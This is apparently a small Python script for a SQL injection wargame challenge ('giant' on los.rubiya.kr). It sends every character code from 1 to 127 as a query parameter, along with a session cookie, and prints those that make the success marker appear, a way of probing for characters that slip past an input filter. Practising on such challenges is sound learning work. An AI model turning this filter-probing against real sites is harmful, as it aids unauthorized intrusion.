import requests

url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php"
cookie = dict(PHPSESSID="2fe29pshtdqrc7jtiuetqrncb9")

for j in range(1, 128):
    payload = f'{chr(j)}'
    print(payload)
    response = requests.get(url, cookies=cookie, params={"shit":payload})
    if "<h2>" in response.text:
        print(j)
        print(response.text)

